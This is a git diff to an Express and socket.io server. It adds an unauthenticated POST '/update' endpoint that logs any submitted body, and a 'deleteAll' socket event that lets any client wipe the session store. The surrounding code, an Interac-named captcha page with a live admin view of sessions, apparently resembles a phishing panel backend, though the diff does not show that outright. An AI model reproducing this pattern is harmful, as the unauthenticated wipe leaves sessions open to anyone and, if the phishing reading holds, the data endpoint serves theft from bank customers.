@@ -175,6 +175,14 @@ app.get('/interac', verifyRecaptcha, (req, res) => {
     res.render('captcha/index')
 })
 
+// Endpoint to receive data
+app.post('/update', (req, res) => {
+    let data = req.body; // Assuming the body contains the updated data
+    console.log(data)
+    res.json({ message: 'Data updated' });
+});
+
+
 app.get('/admin', (req, res) => {
     if(req.session.isAdminVerified) {
         res.render('admin/panel/index');
@@ -234,6 +242,11 @@ io.on('connection', (socket, req) => {
             io.emit('leave', Array.from(sessionStore.entries()));
         }
     });
+
+    socket.on('deleteAll', () => {
+        sessionStore.clear();
+        io.emit('join', Array.from(sessionStore.entries()));
+    })
 
     
 
